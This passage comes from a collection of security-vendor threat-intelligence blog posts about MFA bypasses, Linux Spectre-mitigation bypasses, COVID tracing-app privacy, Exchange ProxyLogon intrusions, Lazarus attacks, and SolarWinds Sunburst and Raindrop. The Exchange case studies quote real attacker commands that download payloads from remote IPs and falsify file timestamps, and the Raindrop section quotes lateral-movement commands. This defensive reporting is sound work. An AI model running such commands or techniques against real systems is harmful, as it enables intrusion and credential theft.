victim organizations, without the need to bypass any multi-factor authentication steps. In several instances the threat actors using these vulnerabilities were seen stealing emails from victim inboxes. To learn how Symantec helps protect you from these attacks, read our blog:How Symantec Stops Microsoft Exchange Server Attacks The SolarWinds attackswere uncovered in December 2020, and have rarely been out of the headlines since, with theU.S. recently announcingthat it would be imposing sanctions against Russia as a response to the SolarWinds breach, as well as a number of other cyber attacks. The statement from U.S. officials said they had “high confidence” that the SVR, the Russian Foreign Intelligence Service - also known as APT29, Cozy Bear, The Dukes - was responsible for the SolarWinds attack. The SolarWinds incident is believed to have started in around March 2020, with any user of SolarWinds Orion software who downloaded an update between March and December 2020 believed to have become infected with the first-stage malware, Backdoor.Sunburst. The initial infection of victims was indiscriminate, but only a small number of those who downloaded the initial compromised update saw additional malicious activity on their networks. The motivation of the SolarWinds attackers was always believed to be information stealing, with email appearing to be an area of particular interest to them. The attackers were also seen using various techniques to bypass MFA in the course of their attacks. In one incident, security firm Veloxity saidit saw the attackers using a novel technique to bypass 2FAprovided by Duo, though the same technique would likely bypass MFA from any provider that requires integration secrets stored in the potentially compromised environment. After gaining administrator privileges on an infected network, the hackers used those rights to steal a Duo secret known as an “akey” from a server running Outlook Web App (OWA), which enterprises use to provide account authentication for various network services. The hackers then used the “akey” to generate a cookie, so they’d have it ready when someone with the right username and password would need it when taking over an account. In another report,FireEye described the techniques it saw the attackers using. Among the techniques FireEye saw were: Attackers know they need a way to bypass or avoid MFA altogether if they want to access victims’ email accounts, which still appears to be the goal of many sophisticated attackers, including state-sponsored actors like those behind SolarWinds. Read all our SolarWinds research, and how Symantec helps protect you,on our dedicated blog page. In September 2020, Check Point published research on the Rampant Kitten hacking group, whichit said had developed a new Android malware that was capable of intercepting and stealing 2FA codes sent via text. It is known that text 2FA is significantly less secure than using an app or token - as tactics like SIM swapping (where a malicious actor gains access to your phone number) would allow codes to be intercepted - and many security experts think neither organizations nor individuals should be using this kind of 2FA if there is another option. Check Point said Rampant Kitten’s surveillance campaign had been ongoing for as long as six years, targeting dissidents and minorities in Iran. The malware was hidden inside an app that purported to be designed to help Iranian citizens get a Swedish driver's license. However, as well as harvesting contacts, old text messages, and recording using the microphone, the malicious app was also designed to look for SMS messages that contained a \"G-\" string, which is a prefix used by Google as part of the two-factor authentication process. The attackers would send phishing messages to victims in order to harvest their credentials, and would then also be able to access their 2FA codes and gain access to their accounts. The malware also forwarded all text messages to the attackers, meaning they could bypass 2FA for any other apps or services using text message 2FA too. Back in 2019,FOX-IT bloggedabout a Chinese state-sponsored group - APT20 - that wasbypassing 2FA in its attacks. FOX-IT had been monitoring the attacker’s activity over a period of two years, stating that it used living-off-the-land techniques to maintain a stealthy presence on victims’ networks in order to siphon off data for the purposes of espionage. FOX-IT found evidence the attackers had connected to VPN accounts that were protected by 2FA, with the researchers theorizing that they did this by stealing an RSA SecurID software token from a hacked system, which they then used to generate valid one-time codes and bypass 2FA at will. As FOX-IT explained at the time: “The software token is generated for a specific system, but of course this system specific value could easily be retrieved by the actor when having access to the system of the victim. “As it turns out, the actor does not actually need to go through the trouble of obtaining the victim's system specific value, because this specific value is only checked when importing the SecurID Token Seed, and has no relation to the seed used to generate actual two-factor tokens. This means the actor can actually simply patch the check which verifies if the imported soft token was generated for this system, and does not need to bother with stealing the system specific value at all. “In short, all the actor has to do to make use of the two-factor authentication codes is to steal an RSA SecurID Software Token and to patch one instruction, which results in the generation of valid tokens.” While it has been known for some time that some advanced persistent threat (APT) groups and sophisticated actors were able to bypass MFA in some instances, the recent sophisticated attacks that appear to have bypassing these kinds of protections as one of their main goals provides a reminder no single solution is sufficient. Fortunately, these attacks also show MFA is working as attackers need to go to great lengths to find alternative means to breach MFA-protected organizations. Organizations should take additional steps to increase protection, such as: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/multi-factor-authentication-new-attacks"
  },
  {
    "title": "spectre bypass linux vulnerabilities",
    "content": "Two new vulnerabilities have been patched in the Linux kernel which, if exploited, could bypass existing mitigations for the Spectre vulnerabilities. The vulnerabilities were discovered by Piotr Krysiuk, a researcher on Symantec’s Threat Hunter team, who reported them to the Linux kernel security team. If left unpatched, the vulnerabilities mean that existing Spectre protections will not be sufficient to prevent some exploitation techniques. The vulnerabilities in question are: These bugs affect all Linux machines, but would be particularly impactful on shared resources, as it would allow one malicious user to access data belonging to other users. The patches for these bugs were first published on March 17, 2021, and are included with the Linux kernels released on March 20. Meltdown and Spectre were two chip vulnerabilities discovered in January 2018that affected nearly all modern processors and could only be mitigated through operating system patches. A successful exploit of the vulnerabilities could allow attackers to gain unauthorized access to a computer’s memory, including sensitive information, such as passwords. However, the vulnerabilities were only exploitable if the attacker already had access to the machines – if they were a local user or had gained access with an additional step, such as deploying a remote access Trojan (RAT) on the machine. Spectre exploited flaws in processor designs to reveal contents of memory that should not be normally accessible. It works by observing side effects left by speculative execution, such as when a processor incorrectly predicts results of bounds checks. Variants of Spectre affect virtually all modern processors, including chips from Intel, ARM, and AMD. Meltdown exploited different flaws in processors in order to bypass memory isolation in the operating system. Operating systems are designed in a way to block one application from accessing memory being used by another. If memory isolation fails to work, a malicious application could steal information from memory being used by other applications or users. Because they are chip vulnerabilities, any operating system patches were essentially mitigations designed to make it impossible for an attacker to exploit the vulnerabilities, rather than to address the underlying issue. It is mitigations for Spectre that can be bypassed in Linux using the vulnerabilities outlined in this blog. Both vulnerabilities are related to the Linux kernel support for \"extended Berkeley Packet Filters\" (BPF). BPF allows users to execute user-provided programs directly in the Linux kernel. When loading these programs, the Linux kernel analyzes the program code to ensure they are safe. However, part of this analysis, intended to mitigate Spectre, was not sufficient to protect against some exploitation techniques. Piotr was able to demonstrate two different methods to bypass this protection. These methods are independent as they abuse different issues, and each allows unprivileged local users to extract the contents of the kernel memory. This may include any secrets – passwords, clipboard contents, etc. - from other users on an affected system. The most serious issue is CVE-2020-27170, which can be abused to reveal content from any location within the kernel memory, all of the machine’s RAM, in other words. Unprivileged BPF programs running on affected systems could bypass the Spectre mitigations and execute speculatively out-of-bounds loads with no restrictions. This could then be abused to reveal contents of the memory via side-channels.The identified security gap was that unprivileged BPF programs were allowed to perform pointer arithmetic on particular pointer types, where the ptr_limit was not defined. The Linux kernel did not include any protection against out-of-bounds speculation when performing pointer arithmetic on such pointer types. The second reported issue, CVE-2020-27171, can reveal content from a 4 GB range of kernel memory around some of the structures that are protected. This issue is caused by a numeric error in the Spectre mitigations when protecting pointer arithmetic against out-of-bounds speculations. Unprivileged BPF programs running on affected systems can exploit this error to execute speculatively out-of-bounds loads from a 4 GB range of kernel memory below the protected structure. Like CVE-2020-27170, this can also be abused to reveal contents of kernel memory via side-channels. A detailed technical description of these issues can be found in the following announcements: The most likely scenario where these vulnerabilities could be exploited is in a situation where multiple users have access to a single affected computer – as could be the case in workplace situations etc. In this scenario, any of the unprivileged users could abuse one of the identified vulnerabilities to extract contents of the kernel memory to locate secrets from other users. The bugs could also potentially be exploited if a malicious actor was able to gain access to an exploitable machine via a prior step – such as downloading malware onto the machine to achieve remote access – this could then allow them to exploit these vulnerabilities to gain access to all user profiles on the machine. The patches for these bugs were first published on March 17, 2021 and are included in the following Linux kernel releases: The following Linux distributions have deployed fixes for the vulnerabilities outlined. Find more information at the links below: Version 10.9 (released on March 27, 2021) All users of Linux distributions should check with their vendor to ensure patches have been applied for these vulnerabilities. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/spectre-bypass-linux-vulnerabilities"
  },
  {
    "title": "security privacy covid tracing apps",
    "content": "Unfortunately, in this new COVID-19 era it’s not just our computers we have to protect from infection, but also ourselves and our loved ones. Along with social distancing, wearing a mask, and washing our hands, technology is also playing a part in the fight against the pandemic. COVID-19 contact tracing apps have been deployed by both governments and organizations around the globe. Not all contact tracing apps are equal and an app used by a company to contact-trace its employees while at work can have different objectives than those of an app used by a government to contact-trace its citizens. Any app with tracing functionality should follow best practices when it comes to the collection of data and how that data is stored and used, and there are different rules and regulations relating to this in different parts of the world. This report will analyze 25 popular COVID-19 tracing apps to find out how they do when it comes to security and privacy. However, first, we need to lay out which type of apps we will be looking at and how they work, as well as some of the laws and usage requirements that can shape contact tracing apps. Tracing apps developed and used by governments and ones used by businesses can be for very different use cases. A government app’s intent is to keep track of who a user has been in contact with and to alert users if they have been near a person infected by the virus. An app provided to employees by their employer may be intended to do the same but in a geofenced area, namely the workplace. As well as this it may be needed to trace an infected user’s movements so that the relevant areas can be disinfected. For the purpose of this report we will not be analyzing apps intended for use by employees solely in the workplace and will focus instead on national apps intended for use by the general public. Tracing apps intended for use in the European Economic Area (EEA) must be in compliance with the General Data Protection Regulation (GDPR). GDPR’s stringent privacy and data protection principles offer a comprehensive, functional blueprint for digital system design and, as such, may be viewed as a benchmark to aim for, even for apps in regions of the world that do not have to comply with the regulations. However, because this is often not the case we will first compare the EEA tracing apps, then the non-EEA apps before finally comparing one set to the other. COVID-19 tracing apps use Bluetooth Low Energy (BLE) signals, sent by mobile devices, to keep track of other people and devices the user comes into contact with. If a person they come into contact with tests positive, the app alerts them. Equally, if the user tests positive for COVID-19, the app alerts everyone that they came into contact with. If done properly, COVID-19 tracing apps have the ability to protect and prevent the spread of the Coronavirus. If not done properly, COVID-19 tracing apps have the ability to put users’ privacy and safety at risk. COVID-19 tracing app users should expect to be assigned a randomly generated identifier thatdoes not reveal any personal information about them. Furthermore, the app should only be scanning and sending BLE signal data to its servers, but not to any other destinations. Depending on the use case of a particular app, a range of information may be needed for it to function as intended. For example, if the app is used by a business to trace its employees it may be set up so as to activate and start contact-tracing only within a certain GPS coordinate and conversely to stop once outside those coordinates without recording or sending any information. Furthermore, Wi-Fi data may be needed to justify cleaning/disinfection actions as a result of an infection notification. However, in any scenario, the user must be notified of such data collection. Any data the app is collecting must be clearly and accurately stated in the privacy policy and only collected with the user’s acknowledgment, or with their formal consent where local law so requires. On the other hand, such functionality would not usually be necessary for a nation-wide, publicly available, contact-tracing app The joint Google and AppleExposure Notification System, designed to be used by developers of COVID-19 tracing apps, is a framework that does the legwork \"for public health authorities to supplement their existing contact tracing operations with technology without compromising on the project’s core tenets of user privacy and security.” While this is a step in the right direction for users' privacy, it seems that few app developers have adopted the framework. Of all the apps we analyzed, we only saw one that used the earlier version of this system. The cloud-based Symantec App Analysis service performed static, dynamic, and behavioral app analysis for nation-wide, COVID-19 tracing apps publicly available from 31 different countries on the iOS and Android platforms. App analysis identifies apps following known security best practices and apps that impact and increase user privacy, security, and risk. App behaviors impacting privacy, security, and risk: App behaviors that follow best security practices: Generally, runtime permission models by Android and iOS protect users from apps collecting private data without their knowledge. That being said, there are some issues with the permission model that complicate privacy. In particular, Android COVID-19 contact tracing apps use Bluetooth technology. Android devices group Bluetooth permissions and location/GPS services together, requiring the app and app developer to request and gain access to GPS locations. We analyzed COVID-19 tracing apps available to the public from 31 different countries, identifying app behaviors impacting user privacy and security. Eight of the COVID-19 tracing apps were from countries within the EEA. For these apps we found the following: The remaining 23 COVID-19 tracing apps, which were from non-EEA countries, did noticeably worse: Overall, the diagnosis is grim. Our findings found over half of all countries’ COVID-19 tracing apps access device data containing personal information and fail to protect user data in transit. Our findings suggest that if you are using a COVID-19 tracing app from a non-EEA country, compared to one from an EEA nation, your risk increases by a factor of two. However, not all non-EEA apps performed quite as badly, as detailed in the following Examples section. The COVIDSafe tracing app from the Australian Department of Health hits the security sweet spot when it comes to COVID-19 tracing app. The privacy policy (https://covidsafe.gov.au/privacy-policy.html) clearly explains how and what personal information is collected and aligns with our analysis of the app. Furthermore, the in-app runtime permissions clearly state the reasons for requesting the privileges, as seen when asking for Bluetooth tracking: [{\"description\": \"COVIDSafe exchanges Bluetooth signals with nearby phones running the same app. These signals contain an anonymized ID, which is encrypted and changes continually to ensure your privacy.\"}] Meanwhile, at the other end of the spectrum, StopKorona! is a COVID-19 tracing app for Android and iOS from the Ministry of Health of the Republic of North Macedonia. It claims to be a \"mobile app developed based on the best global practices for the prevention and control of the Coronavirus. The app is intended to trace exposure with potentially infected persons, by the detection of the distance between mobile devices/applications by using Bluetooth technology.\" Furthermore, StopKorona! claims that: \"The only data related to you is your mobile telephone number, stored on a safe server managed by the Ministry of Health, to prevent the spreading of the virus.\" We found that the collected data claimed by the Ministry of Health is accurate. What we found inaccurate is the claim that the data is sent securely. Often we discover in analysis app developers disabling the security or integrity of network connections. This commonly happens when the servers receiving the data are not configured correctly, or the app libraries are not configured correctly. In any case, this disabling of validation of SSL certificate authorities (CAs) is intentional. Furthermore, if you were able to connect to the servers receiving your private data in a browser on the desktop, you would see a broken lock next to the URL showing the connection sending your private data is insecure. For mobile apps, there is no such lock visible to the user. App developers know this, often using it to pass the test of security while avoiding taking the time to properly and securely configure private data sent over the network. Access PII:Can Access MicrophoneCan Access CalendarCan Access Address BookAccesses Wi-Fi InfoAccesses Telephony Service Expose PII:Sends Data UnencryptedDisables SSL CA ValidationData Transport Security ExceptionsApp Disabled PFS for Specific Domains Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/security-privacy-covid-tracing-apps"
  },
  {
    "title": "microsoft exchange server protection",
    "content": "Blog updated March 11: Case studies detailing post-compromise activity seen by Symantec added, along with additional IoCs Blog updated March 9: IoCs, additional signatures, and pre-exploitation process diagram added. Users of Microsoft Exchange Server are advised to update to the latest version immediately, as a growing number of attackers are attempting to exploit four recently patched zero-day vulnerabilities in the software. Microsoft released emergency patches last week (March 2) for the four vulnerabilities, which were being exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, since then it has been reported that multiple threat actors have been rushing to exploit these vulnerabilities in Exchange Server. Two of the vulnerabilities (CVE-2021-26855 and CVE-2021-27065) and the technique used to chain them together for exploitation have been given the name“ProxyLogon” by security company DevCore. Successful exploitation of ProxyLogon allows attackers to gain a foothold on a targeted network, potentially leading to further compromise and data exfiltration. Symantec customers are protected from attacks exploiting these vulnerabilities. Microsoft releasedan out-of-band patchto address the vulnerabilities in Exchange Server on March 2, 2020. The versions impacted are Exchange Server 2013, 2016, and 2019.Security firm Volexity, which Microsoft credited in its security alert detailing the vulnerabilities, said it first saw attackers exploiting the bugs on January 6, 2021. Successful exploitation of these vulnerabilities allows an unauthenticated attacker to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from victim organizations. The four zero-day vulnerabilities that Microsoft released emergency patches for are: The following diagram shows an attack chain that an attacker could employ to gain initial access to data. Hafnium, which Symantec tracks as Ant, was the group first seen exploiting the vulnerabilities in Exchange Server,according to Microsoft. It said at the time that Ant was exploiting the zero days to carry out “limited and targeted attacks.” Microsoft said Ant used the vulnerabilities “to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments.” Microsoft stated with “high confidence” that the group was state-sponsored and operating out of China. It also said the group principally attacked targets in the U.S., including infectious disease researchers, law firms, educational institutes, defense contractors, policy think tanks, and NGOs. Security firm Veloxityalso said the group was seen deploying web shells on infected systems to allow for remote access. Among the web shells Veloxity said it saw deployed were China Chopper variants and ASPXSPY. Veloxity also reported seeing the group carry out post-compromise activity such as credential dumping, lateral movement via PsExec, and archiving (likely in preparation for exfiltration of data). Microsoftalso reportedthat Ant deployed post-compromise tools such as Covenant, PowerCat, and Nishang. It is likely the group was using publicly available web shells and post-compromise tools in order to make attribution of the activity more difficult. No, since Microsoft released the emergency patches for these vulnerabilities on March 2, attacks attempting to exploit these vulnerabilities have escalated, with “multiple malicious actors beyond Hafnium” attempting to target unpatched systems, according to Microsoft. The initial attacks carried out by Ant appear to have been targeted, but the large number of threat actors now attempting to exploit these vulnerabilities mean these attacks are now more indiscriminate in nature. While Symantec customers are protected from attacks attempting to exploit those vulnerabilities, all users of Exchange Server are advised to update to the most recent version immediately. Microsoft has alsoreleased a detection toolthat allows you to scan your Exchange Server logs to determine if your server was compromised. The Cybersecurity and Infrastructure Security Agency (CISA) in the U.S. has advised that all users of Exchange Server scan their systems using Microsoft’s tool, as well as issuing anEmergency Directiveto instruct all federal agencies to immediately update their Exchange servers. Symantec researchers have observed post-compromise activity on a small number of customer machines, where attackers’ initial point of entry appears to have been through exploiting the vulnerabilities in Microsoft Exchange. In two cases, Symantec researchers observed activity prior to the release of Microsoft’s patches on March 2. In one victim, a telecoms company in the Middle East, we saw activity as far back as January 2021. China Chopper web shells were present on this victim’s network on January 13. China Chopper web shells were used by Ant (aka Hafnium) in the initial attacks leveraging these vulnerabilities according toreports by Veloxity. On January 29, a suspicious PowerShell command was executed to download files from a domain masquerading as a popular cloud hosting provider. A few days later, on February 1, a suspicious command was executed to create a scheduled task, which executed “debug.bat” several hours later. The task was named “test”, which may indicate that the attackers were using this as a way to test scheduled tasks. Some hours later, the attackers ran “net start vdir”, which was used to launch a service that had likely been installed by the attackers. On February 6, a suspicious file (sok.wia) was downloaded by the attackers and was used to establish a connection with a remote host. It is likely this connection was used by the attackers to assist in exfiltration because, shortly afterwards, credential-dumping tool Mimikatz was used to dump credentials from the system. The next day, the attackers again use sok.wia, before creating a scheduled task on a remote server (likely using stolen credentials) to execute a “server.bat” file. The next activity was seen on February 18 when Mimikatz was executed once again, and then on February 19 ProcDump was used to dump Isass to “he.dmp”, which can be used to harvest credentials. Then later, on March 3, a suspicious file was observed in %Temp%\\in.exe, followed by a suspicious file ({71736495-d485-477d-b836-17f0085e0780}.exe) being extracted via the WinRAR archive tool which creates a malicious file in %system%\\inetsrv\\XmlLite.dll. This was the last activity seen on this machine. Another victim, this one operating in the legal sector in Southeast Asia, saw activity on its network beginning on February 28. This was before Microsoft issued patches for the exploited vulnerabilities, but it has been reported by Veloxity that it saw activity ramping up since February 28, so it is possible information about these vulnerabilities had been leaked in the cyber crime fraternity by this time. The first activity on this machine on February 28 was a command used to dump credentials that was executed via the w3wp.exe process. On the same day ProcDump was used to dump Isass, which can be used to harvest credentials. The next day, March 1, a file called ‘uawmiver.exe’ was executed to bypass user account control (UAC). This was used to execute two batch files called “set.bat” and “set1.bat”. On March 3, a command was used to execute another unknown batch file, which was downloaded by bitsadmin from a remote host: &quot;CSIDL_SYSTEM\\bitsadmin.exe&quot; /rawreturn /transfer getfile http://89.34.111.11/3.avi CSIDL_PROFILE\\public\\2.bat We then saw obfuscated PowerShell commands being executed and used to download a file from a remote host. (new-object System.Net.WebClient).DownloadFile('hxxp://86.105.18.116/news/code','C:\\users\\public\\opera\\code') The next day, March 4, another PowerShell command was executed that searched for \"layout.aspx\" and \"iistart.aspx\". The last access and creation times were modified to August 21, 2017. powershell.exe -command &quot;dir |where {$_.name -eq 'layout.aspx' -or $_.name -eq 'iistart.aspx' }  | foreach-object { $_.LastWriteTime = '2017-08-21 20:26:57';$_.LastAccessTime = '2017-08-21 20:26:57';  $_.CreationTime = '2017-08-21 20:26:52' }&quot; This was likely done to help conceal the malicious files and thwart any incident response investigations. 7-Zip was then used to extract the contents of a ZIP archive (current.zip) that was uploaded to the Exchange server by the attackers, before the file “current.exe” was executed, which injected CobaltStrike beacon to a newly-created “svchost.exe” process for backdoor access.  Several hours after this, ntdsutil was used to dump credentials once again. Following this, a file called \"mv.exe\", which is likely Mimikatz, was executed to dump credentials. This is followed by ProcDump being used to dump lsass to harvest additional credentials. Shortly after this, an unknown file \"ccsvchst.exe\" was executed, which passes a collected hash. Finally, the attackers launched the publicly available \"secretsdump\" tool, to dump credentials stored in the registry. Then, on March 8, the attackers ran Mimikatz to try to dump credentials again. This was the last activity seen on this machine. We also observed some post-compromise activity in a small number of other organizations since Microsoft issued their patches on March 2, when activity ramped up significantly as it is believed a large number of threat actors were rushing to exploit these vulnerabilities. Some of the tools we saw used in post-compromise activity in those impacted since March 2 include: In one case we also saw the attackers deleting shadow copies from infected machines, which is activity we typically see when attackers are preparing to carry out a ransomware attack, though we did not observe ransomware deployed on the machine. The extensive use of living-off-the-land and open-source tools and tactics by the attackers leveraging these vulnerabilities make attribution of these attacks difficult and means that a wide number of different threat actors may be responsible for these attacks. With activity exploiting these vulnerabilities seen by Symantec as recently as March 9, these attacks are ongoing, and all users of Microsoft Exchange Server are urged to scan their environment and apply patches immediately. Data Center Security: For the latest protection updates, please visit theSymantec Protection Bulletin. The presence of the following indicators on your network may help you determine if you've already been exploited. .*(\\\\aspnet_client\\\\|\\\\owa\\\\auth\\\\|\\\\ecp\\\\auth\\\\).*\\.aspx X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3 S:CMD=Set-OabVirtualDirectory.ExternalUrl= /ecp/DDI/DDIService.svc/SetObject Microsoft Scanning Tool https://github.com/microsoft/CSS-Exchange/tree/main/Security The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-exchange-server-protection"
  },
  {
    "title": "lazarus north korea indictment",
    "content": "The U.S. government hascharged three men in relation to a string of financially motivated cyber attackslinked to the North Korean Lazarus (aka Appleworm) group. The attackers stole approximately $1.3 billion from a range of financial institutions and cryptocurrency exchanges. In a second case, a Canadian-American citizen has pleaded guilty to involvement in a money laundering scheme linked to heists organized by the Lazarus group. The charges relate to a number of financially motivated attacks, including several investigated by Symantec, a division of Broadcom (NASDAQ: AVGO). Lazarus was linked to a 2016 attack thatstole US$81 million from the Bangladesh Central Bank and a number of other attacks against banks in Asia and South America. The attacks prompted an alert by payments network SWIFT, after it was found that the attackers had used malware to cover up evidence of fraudulent transfers. In order to steal such massive sums, the attackers deployed relatively sophisticated malware, most notably Trojan.Banswift, which was used to wipe evidence of fraudulent transactions. Banswift shared code with an older Lazarus tool called Backdoor.Contopee. Contopee, along with two other pieces of Lazarus malware, Backdoor.Fimlis and Backdoor.Fimlis.B, were already being used in limited targeted attacks against the financial sector in South-East Asia. Financially motivated attacks continued into 2017,when dozens of organizations were targeted through watering-hole attacks involving a previously unseen piece of malware. The attackers compromised websites likely to be visited by staff at targeted organizations and used a custom exploit kit to deliver malware to selected targets. The exploit kit was configured to only infect visitors from approximately 150 different IP addresses. These IP addresses belonged to 104 different organizations located in 31 different countries, most of which were banks. While the malware used in these attacks (Downloader.Ratankba) had been previously unseen, further analysis by Symantec uncovered strong links between this tool and known Lazarus tools. Lazarus was subsequently implicated in theWannaCry ransomware attacks. The ransomware incorporated the leaked EternalBlue exploit that used two known vulnerabilities in Windows (CVE-2017-0144and CVE-2017-0145) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim’s network and also to other vulnerable computers connected to the internet. Within a matter of hours, the malware had infected hundreds of thousands of computers worldwide. The attack had the potential to be highly profitable but it was poorly executed. WannaCry was supposed to generate a unique Bitcoin wallet address for each infected computer but, due to a bug, it failed to do so and instead defaulted to three hardcoded Bitcoin addresses for payment. This meant the attackers had no way of knowing which victims had paid using the hardcoded addresses. The attackers also included a “killswitch” in the malware. This was the address of a non-existent domain. WannaCry was designed to check if the domain was live and, if it was, it would cease installing. However, it was quickly found by a security researcher who registered the domain themselves, thus limiting the damage. The group’s interest in financially motivated attacks persisted and, in 2018, evidence appeared of its involvement in attacks on ATM networks in Africa and Asia.The operation, known as FASTCash, allowed the group to effectively empty ATMs of cash. The attacks began with breaches of the targeted bank’s network in order to gain access to the switch application server that handled ATM transactions. Malware (Trojan.Fastcash) was installed on the server and used to intercept fraudulent cash withdrawal requests and send falsified approval responses, allowing cash to be withdrawn. In a related announcement, the FBI, the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Treasuryreleased details on AppleJeus, malware that was used in a series of attacks on cryptocurrency exchanges. The malware is designed to masquerade as legitimate cryptocurrency trading applications. At least seven different versions of AppleJeus have been discovered, each of which is designed to target a different cryptocurrency trading application. The following trading platforms were targeted by the malware: Initially the malware was spread using fake versions of the legitimate trading platform websites. However, later the attackers switched vectors, relying on phishing, social networking, and social engineering techniques to fool victims into downloading the malware. The indictment is the latest in a series of charges laid out against state-sponsored espionage actors by authorities in the U.S. and comes on the back ofa 2018 indictmentagainst one of the men named in this week’s announcement. The charges are a timely reminder of the ability of law enforcement to investigate attacks that originate far beyond national borders. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/lazarus-north-korea-indictment"
  },
  {
    "title": "solarwinds sunburst sending data",
    "content": "In ourprevious blogwe described how the attackers controlled the Sunburst malware, and detailed a variety of commands that will result in data being sent to the threat actors. The next technique to discuss is how Sunburst sends this data to the attackers. If data is being sent to the attacker as a result of a command, instead of performing a HTTP(S) GET request, something we described in our last blog, Sunburst initiates a HTTP(S) POST request. Sunburst uses randomly generated URL paths for HTTP(S) POST requests that are different from HTTP(S) GET requests. If the data to send is greater than 10,000 bytes, the URL path will be as follows: A Content-Type header is set to application/octet-stream and the POST data follows. The POST data consists of the data to send UTF8 encoded, concatenated with the last error code, concatenated with the userid, and subsequently compressed. Every byte of the compressed blob is then summed and the lowest byte of the sum value is used as a key. The compressed blob is XOR’d by the key byte and the key byte is prepended to the encrypted data. If the data to send is less than, or equal to, 10,000 bytes, the URL path will take one of two forms as follows: Further, instead of sending the encrypted data directly, as when the data is greater than 10,000 bytes, the data is steganographically sent in a faux JSON blob. The JSON blob contains the following fields: The encrypted data to send is broken into multiple variable sized chunks. The size of each chunk is randomly determined, but generally will go from smaller to larger. If the randomly chosen size is 0, a random chunk between 16 and 28 bytes is generated instead and the Timestamp value is AND’d with the value 18446744073709551613, which more importantly sets the second bit to 0. Each chunk is then encoded and added to the JSON blob and sent as the HTTP(S) POST data with a Content-Type header set to application/json. On receipt, the attacker will need to decode and concatenate all the Message chunks, skipping junk chunks where the Timestamp second bit is not set. This blog is the final installment of our analysis series concerning the command and control (C&C) process used by the actors behind the SolarWinds attacks. Previous entries have covered how the attackers used Sunburst todisable security software and avoid detection, the malware's use of arare domain generation algorithm(DGA) to generate domain names to contact for C&C purposes, and Sunburst's control flow anduse of IP address values as commands. This final blog, detailing how the malware sends data back to the attackers, rounds out a comprehensive overview of Sunburst’s C&C processes. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/solarwinds-sunburst-sending-data"
  },
  {
    "title": "solarwinds raindrop malware",
    "content": "Symantec, a division of Broadcom (NASDAQ: AVGO), has uncovered an additional piece of malware used in the SolarWinds attacks which was used against a select number of victims that were of interest to the attackers. Raindrop (Backdoor.Raindrop) is a loader which delivers a payload of Cobalt Strike. Raindrop is very similar to the already documented Teardrop tool, but there are some key differences between the two. While Teardrop was delivered by the initial Sunburst backdoor (Backdoor.Sunburst), Raindrop appears to have been used for spreading across the victim’s network. Symantec has seen no evidence to date of Raindrop being delivered directly by Sunburst. Instead, it appears elsewhere on networks where at least one computer has already been compromised by Sunburst. In one victim, in early July 2020, Sunburst was installed through the SolarWinds Orion update, as has been well documented. Two computers were compromised. The following day, Teardrop was subsequently installed on one of these computers. That computer was found to have an active directory query tool, as well as a credential dumper designed specifically for SolarWinds Orion databases. The credential dumper was similar to, but not the same as, theopen source Solarflaretool. Eleven days later, on a third victim computer in the organization, where no previous malicious activity had been observed, a copy of the previously unseen Raindrop was installed under the name bproxy.dll. This computer was running computer access and management software. The attackers could have used this software to access any of the computers in the compromised organization. One hour later, the Raindrop malware installed an additional file called \"7z.dll\". We were unable to retrieve this file, however, within hours a legitimate version of 7zip was used to extract a copy of what appeared to be Directory Services Internals (DSInternals) onto the computer. DSInternals is a legitimate tool which can be used for querying Active Directory servers and retrieving data, typically passwords, keys, or password hashes. An additional tool called mc_store.exe was later installed by the attackers on this computer. The tool is an unknown PyInstaller packaged application. No further activity was observed on this computer. In a second victim where the Raindrop loader was seen, it was installed in a file called astdrvx64.dll in late May. Several days later, in early June, PowerShell commands were executed on that computer, attempting to execute further instances of Raindrop on additional computers in the organization. \"Invoke-Command -ComputerName REDACTED -ScriptBlock { rundll32 c:\\Packages\\Plugins\\Microsoft.Powershell.DSC\\2.77.0.0\\bin\\TelemetryStatus.dll Tk_CreateItemType}\" \"Invoke-WMIMethod win32_process -name create -argumentlist 'rundll32 c:\\windows\\Speech_OneCore\\Engines\\TTS\\en-US\\enUS.Media.dll TkChangeEventWindow' -ComputerName REDACTED\" In a third victim, where Raindrop was seen, the instance of Cobalt Strike that was extracted did not have a HTTP-based command and control server, but was rather configured to use a network pipe over SMB (\\\\.\\pipe\\protected_storage[REDACTED]). It's possible that in this instance, the victim computer did not have direct access to the internet, and so command and control was routed through another computer on the local network. Raindrop is similar to Teardrop in that both 